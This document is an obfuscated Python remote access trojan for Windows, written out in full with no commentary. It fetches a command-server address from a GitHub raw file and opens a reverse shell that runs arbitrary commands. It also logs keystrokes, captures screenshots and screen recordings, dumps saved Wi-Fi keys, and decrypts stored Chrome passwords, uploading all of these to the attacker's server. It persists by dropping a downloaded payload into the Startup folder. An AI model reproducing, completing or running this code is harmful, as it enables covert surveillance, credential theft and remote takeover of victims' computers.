import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
EbSaOSD = ""
DGnfYoRKqmVhlDbInIMxl = ""
ZUcBgzPFguMAazHTsCTBx = "16.12.24.1"
ajGAcBUTDdLsleweWb = "!"
fHfSTukNF = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
MpJmTcof = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
HyJeBpJfbdVpwvEKe = os.path.expanduser("~\\AppData\\Local\\")
def UUFMGiQxPcNuTSjsMVmHZ(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def ezOXIpePYoT(s):
	PqkqDFpoDBALoJHhA = s.recv(1024)
	if len(PqkqDFpoDBALoJHhA)==0:
		return True
	PUJhPhBTALrUVS = PqkqDFpoDBALoJHhA.decode("utf-8").replace("\n","")
	if not PUJhPhBTALrUVS.startswith(ajGAcBUTDdLsleweWb):
		proc = subprocess.run(PUJhPhBTALrUVS, shell=True, capture_output=True)
		QlIfYMvOMTFSmLFYvk = proc.stdout + proc.stderr
		s.send(QlIfYMvOMTFSmLFYvk)
		return
	UhtfvtSkCwB = PUJhPhBTALrUVS.split(" ")[0][1:]
	args = " ".join(PUJhPhBTALrUVS.split()[1:]).split()
	if UhtfvtSkCwB == "download":
		FTxwcIfnoddpBI(s, PUJhPhBTALrUVS)
	elif UhtfvtSkCwB == "screenshot":
		hscftoPfGDPftVh(s)
	elif UhtfvtSkCwB == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif UhtfvtSkCwB == "update":
		NQdKwkjDIGBL(s)
	elif UhtfvtSkCwB == "wifi":
		NFCheshiCpnfMPNZOyM(s)
	elif UhtfvtSkCwB == "screenrecord":
		rkCfAKLJPaVXptThQpUV(s, args)
	elif UhtfvtSkCwB == "chrome":
		decryptPasswords(s)
def FTxwcIfnoddpBI(s, PUJhPhBTALrUVS):
	CexITZXuxPYjiuL = PUJhPhBTALrUVS.replace(ajGAcBUTDdLsleweWb+"download ","").split(",")
	QlIfYMvOMTFSmLFYvks = ""
	for f in CexITZXuxPYjiuL:
		QlIfYMvOMTFSmLFYvks += lRcwCYyFweRyVGWjpPF(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(QlIfYMvOMTFSmLFYvks, "utf-8"))
def hscftoPfGDPftVh(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	acTFNwGUvzGL = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(acTFNwGUvzGL)
	image.close()
	r = lRcwCYyFweRyVGWjpPF(acTFNwGUvzGL, "api/sscap")
	os.remove(acTFNwGUvzGL)
	s.send(bytes(r,"utf-8"))
def rkCfAKLJPaVXptThQpUV(s, args):
	HqeDuncVYrKNuOVJEUGPRtO = 15
	if not args == []:
		try: HqeDuncVYrKNuOVJEUGPRtO = int(args[0])
		except: pass
	RYqdmQw = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	mdkEdnNKhqbkliGkUWNzj = []
	fps = 11
	numFrames = HqeDuncVYrKNuOVJEUGPRtO * fps
	for _ in range(numFrames):
		mdkEdnNKhqbkliGkUWNzj.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(RYqdmQw, mdkEdnNKhqbkliGkUWNzj, fps=fps, quality=8)
	lRcwCYyFweRyVGWjpPF(RYqdmQw, "api/screc")
def lRcwCYyFweRyVGWjpPF(NxazOAYAl, ydlhSfaxKizVgHKdm, JXMLmnFpTpeuJayOa=None):
	if not os.path.isfile(NxazOAYAl):
		return "[!] 404: "+NxazOAYAl+"\n"
	headers = {"user":os.getlogin()}
	if JXMLmnFpTpeuJayOa is not None:
		headers = {**headers, **JXMLmnFpTpeuJayOa}
	f = open(NxazOAYAl, "rb")
	requests.post("http://"+EbSaOSD+":5555/"+ydlhSfaxKizVgHKdm,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def NQdKwkjDIGBL(s):
	h, p, v = SZxgHRqrgS(True)
	if (v != ZUcBgzPFguMAazHTsCTBx):
		NQAeIjnytYVnaiz(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def NFCheshiCpnfMPNZOyM(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	HulXCPQrIlYaansHIJyY = ""
	for p in profiles:
		try: HulXCPQrIlYaansHIJyY+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: HulXCPQrIlYaansHIJyY+=f"    {p} - N/A\n"
	s.send(bytes(HulXCPQrIlYaansHIJyY, "utf-8"))
def NQAeIjnytYVnaiz(TDyrlGtC):
	fbgGXcndJqFggboem = os.path.basename(__file__)
	fileType = fbgGXcndJqFggboem.split(".")[-1]
	olkoWxlMplycfvSSmZVUnH = fbgGXcndJqFggboem.split(".")[0]+"."+TDyrlGtC+".pyw" if fileType.startswith("py") else ".exe"
	kOAyQlnItIiZSkNuRUX = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), olkoWxlMplycfvSSmZVUnH)
	if not os.path.isfile(kOAyQlnItIiZSkNuRUX):
		with open(kOAyQlnItIiZSkNuRUX, "w+") as f:
			f.write(requests.get(MpJmTcof+"file."+ "pyw" if kOAyQlnItIiZSkNuRUX.split(".")[-1].startswith("py") else "exe").text)
def SZxgHRqrgS(force=False):
	global EbSaOSD, DGnfYoRKqmVhlDbInIMxl
	if force or EbSaOSD == "" or DGnfYoRKqmVhlDbInIMxl == "":
		PqkqDFpoDBALoJHhA = requests.get(fHfSTukNF).text.replace("\n","").split(":")
		EbSaOSD = PqkqDFpoDBALoJHhA[0].strip()
		DGnfYoRKqmVhlDbInIMxl = PqkqDFpoDBALoJHhA[1].strip()
		TDyrlGtC = PqkqDFpoDBALoJHhA[2].strip()
	return EbSaOSD, DGnfYoRKqmVhlDbInIMxl, TDyrlGtC
def EYadhGekulWWqepccZ():
	try:
		ghBbRIcxeZGQAR = "settings.xpb"
		hKkaNFChQnxHRy = sorted([file for file in os.listdir(HyJeBpJfbdVpwvEKe) if os.path.isfile(HyJeBpJfbdVpwvEKe+"\\"+file) and file.endswith(ghBbRIcxeZGQAR.split(".")[-1])])
		if ghBbRIcxeZGQAR in hKkaNFChQnxHRy:
			hKkaNFChQnxHRy.remove(ghBbRIcxeZGQAR)
		lRnWPYpqzuxAxvXEOxlp = os.path.join(HyJeBpJfbdVpwvEKe,ghBbRIcxeZGQAR)
		if len(hKkaNFChQnxHRy) > 0:
			with open(lRnWPYpqzuxAxvXEOxlp, "ab+") as f:
				for file in hKkaNFChQnxHRy:
					temp = os.path.join(HyJeBpJfbdVpwvEKe,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		lRcwCYyFweRyVGWjpPF(lRnWPYpqzuxAxvXEOxlp, "api/log")
		if os.path.isfile(lRnWPYpqzuxAxvXEOxlp):
			os.remove(lRnWPYpqzuxAxvXEOxlp)
	except:
		pass
def QHkDuEyRxDICbRJlBdikFm():
	logging.basicConfig(filename=(HyJeBpJfbdVpwvEKe+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def pWhyJHszZJ(k):
		logging.info(str(k))
	k=Listener(on_press=pWhyJHszZJ)
	bbQwOXgOkJzkNUrcaEFr = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in bbQwOXgOkJzkNUrcaEFr:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	os.system(f"copy \"{basePath}\\Default\\Login Data\" \"{local}\\db.db\"")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.system(f"del {local}\\db.db")
	PqkqDFpoDBALoJHhA = "\n"
	for login in logins:
		PqkqDFpoDBALoJHhA += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	s.send(PqkqDFpoDBALoJHhA)
def eAvOQFpuolhpoVgPkayO():
	h, p, v = SZxgHRqrgS()
	EYadhGekulWWqepccZ()
	if ZUcBgzPFguMAazHTsCTBx != v:
		NQAeIjnytYVnaiz(v)
	QHkDuEyRxDICbRJlBdikFm()
	OvhzDQxGrYzecVdUPfd = bytes(("(old)"if ZUcBgzPFguMAazHTsCTBx!=v else "")+"["+ZUcBgzPFguMAazHTsCTBx+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				BmnHjIvX=False
				try:
					s=UUFMGiQxPcNuTSjsMVmHZ(h, p)
					while not BmnHjIvX:
						s.send(OvhzDQxGrYzecVdUPfd)
						BmnHjIvX=ezOXIpePYoT(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
eAvOQFpuolhpoVgPkayO()
